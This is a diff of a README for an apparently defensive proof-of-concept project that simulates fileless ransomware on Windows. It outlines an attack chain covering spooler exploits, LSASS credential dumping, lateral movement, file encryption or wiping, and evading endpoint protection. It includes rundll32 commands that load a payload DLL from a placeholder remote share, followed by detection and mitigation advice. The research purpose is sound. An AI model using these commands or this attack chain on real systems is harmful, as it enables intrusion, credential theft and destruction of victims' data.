@@ -1,5 +1,4 @@
 
-
 # NSFW-Ransomware: Fileless Ransomware Simulation & Detection Research (PoC)
 
 > **Warning**  
@@ -11,17 +10,16 @@
 
 ![nemesis_millar](https://github.com/user-attachments/assets/89c34e28-ed0c-47bf-a9a1-73ace104e532)
 
-
 ---
 
 ## Table of Contents
 
 - [About](#about)
 - [Features](#features)
+- [Technical Overview](#technical-overview)
 - [Getting Started](#getting-started)
   - [Prerequisites](#prerequisites)
   - [Build Instructions](#build-instructions)
-- [Technical Overview](#technical-overview)
 - [Simulated Attack Chain (PowerShell)](#simulated-attack-chain-powershell)
 - [Reconnaissance and LOLBins](#reconnaissance-and-lolbins)
   - [Google Dork Examples](#google-dork-examples)
@@ -39,20 +37,21 @@
 
 ## About
 
-**NSFW-Ransomware** is a proof-of-concept (PoC) project that simulates advanced fileless ransomware and command-and-control (C2) techniques on Windows 10/11. It demonstrates the abuse of trusted Windows system components ("Living Off the Land Binaries" or LOLBins) to execute ransomware operations entirely in memory, with minimal or no disk footprint.
+**NSFW-Ransomware** is a proof-of-concept (PoC) project that simulates advanced fileless ransomware and command-and-control (C2) techniques on Windows 10/11. It demonstrates how trusted Windows binaries can be abused for stealthy, hard-to-detect attacks.
 
-**Primary Objectives:**
+### Primary Objectives
+
 - Enable cybersecurity professionals and students to study fileless ransomware behaviors.
 - Support blue team training, threat hunting, and detection engineering.
-- Demonstrate how attackers can abuse built-in Windows binaries for stealthy, hard-to-detect attacks.
+- Demonstrate abuse of built-in Windows binaries for stealth operations.
 
 ---
 
 ## Features
 
-- **Fileless execution:** Simulates ransomware operations using PowerShell, LOLBins, and in-memory payloads.
-- **Privilege escalation & credential access:** Demonstrates exploitation with no reliance on custom binaries on disk.
-- **Lateral movement & impact:** Simulates propagation and destructive actions using only native tools.
+- **Fileless execution:** Simulates ransomware using PowerShell, LOLBins, and in-memory payloads.
+- **Privilege escalation & credential access:** Demonstrates exploitation without custom binaries on disk.
+- **Lateral movement & impact:** Simulates spreading and destructive actions using native tools only.
 - **Detection bypass:** Designed to evade traditional endpoint protection by avoiding disk writes.
 - **Detection research:** Provides blue teams with realistic attack scenarios for defensive testing.
 
@@ -60,15 +59,30 @@
 
 ## Technical Overview
 
-This project focuses on simulating fileless ransomware attack chains, including:
+This project simulates end-to-end fileless ransomware attack chains:
 
-- **Initial Access:** Downloading and executing payloads in memory via LOLBins (e.g., PowerShell, rundll32.exe).
-- **Privilege Escalation:** Exploiting Print Spooler or HiveNightmare vulnerabilities.
-- **Credential Access:** Dumping credentials from memory (e.g., LSASS).
-- **Lateral Movement:** Using Windows network protocols for spreading.
-- **Impact:** Encrypting or wiping files, disabling recovery mechanisms, all filelessly.
+- **Initial Access:** Download and execute payloads in memory via LOLBins (e.g., PowerShell, rundll32.exe).
+- **Privilege Escalation:** Exploits such as Print Spooler or HiveNightmare.
+- **Credential Access:** Dumps credentials from memory (e.g., LSASS).
+- **Lateral Movement:** Uses Windows network protocols for spreading.
+- **Impact:** Encrypts or wipes files and disables recovery mechanisms, all filelessly.
 
 > **Note:** All techniques are provided exclusively for blue team research and detection engineering.
+
+---
+
+## Getting Started
+
+### Prerequisites
+
+- Windows 10/11 (test in isolated, virtualized environments)
+- PowerShell 5+
+- Administrative privileges for certain simulations
+- [7-Zip](https://www.7-zip.org/) (for extraction tasks)
+
+### Build Instructions
+
+> *Instructions to build or run code components should be placed here if applicable. If the PoC is script-based, provide clear execution steps.*
 
 ---
 
@@ -129,13 +143,13 @@ intitle:"PaperCut MF"
 
 ### Living Off the Land Binaries (LOLBins)
 
-Abusing trusted Windows binaries for stealthy, fileless attacks:
+Abuse trusted Windows binaries for stealthy, fileless attacks:
 
 ```cmd
 rundll32.exe \\10.10.X.X\shared\payload.dll,ReflectEntry
 ```
 
-Attackers may use `rundll32.exe`, `regsvr32.exe`, `powershell.exe`, etc., to execute payloads in-memory from network shares or encoded scripts.
+Attackers may use `rundll32.exe`, `regsvr32.exe`, `powershell.exe`, and others to execute payloads in-memory from network shares or encoded scripts.
 
 ---
 
@@ -157,7 +171,7 @@ Attackers may use `rundll32.exe`, `regsvr32.exe`, `powershell.exe`, etc., to exe
 
 ### Reflective DLL Injection
 
-Loads a malicious DLL directly into memory, evading disk forensics.
+Load a malicious DLL directly into memory, evading disk forensics.
 
 ```cmd
 rundll32.exe \\10.10.X.X\share\nsfw.dll,ReflectEntry
@@ -215,20 +229,20 @@ Demonstrate ransomware/wiper activity using only native binaries:
   - Watch for unusual use of PowerShell and encoded/obfuscated commands.
   - Track unauthorized access or deletion of shadow volumes.
 - **SIEM Correlation (ELK/Splunk):**
-  - Alert on execution from network shares or suspicious parent/child process chains (e.g., `explorer.exe` spawning `rundll32.exe`).
+  - Alert on execution from network shares or suspicious parent/child process chains.
   - Detect encoded PowerShell or CMD commands.
 - **EDR/XDR Solutions:**
   - Use behavioral detections for in-memory execution and reflective DLL injection.
 
 ### Mitigation
 
-- **Disable unnecessary services:**  
+- **Disable unnecessary services:**
     ```cmd
     Stop-Service -Name Spooler -Force
     Set-Service -Name Spooler -StartupType Disabled
     ```
 - **Patch vulnerabilities:** Apply security updates for Windows components (especially Print Spooler, Hive ACL, etc.).
-- **Restrict LOLBins:** Use AppLocker or Windows Defender Application Control (WDAC) to limit use of scripting engines and LOLBins.
+- **Restrict LOLBins:** Use AppLocker or WDAC to limit the use of scripting engines and LOLBins.
 - **Network segmentation:** Restrict access to administrative shares and sensitive network locations.
 - **Regular backups:** Maintain offline and immutable backups.
 
